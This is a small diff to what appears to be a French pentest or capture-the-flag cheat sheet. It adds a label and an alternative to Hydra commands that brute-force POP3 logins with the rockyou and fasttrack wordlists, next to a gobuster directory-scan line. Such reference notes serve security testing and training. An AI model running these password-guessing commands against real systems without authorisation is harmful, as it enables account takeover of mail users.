@@ -18,9 +18,13 @@ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x 
 
 ## Hydra
 
+* Hydra pour pop3
+
 ```
 hydra -l <user>  -P /usr/share/wordlists/rockyou.txt pop3://$IP -s <port> -t 64
 ```
+
+ou
 
 ```
 hydra -l <user>  -P /usr/share/wordlists/fasttrack.txt pop3://$IP -s <port> -t 64 
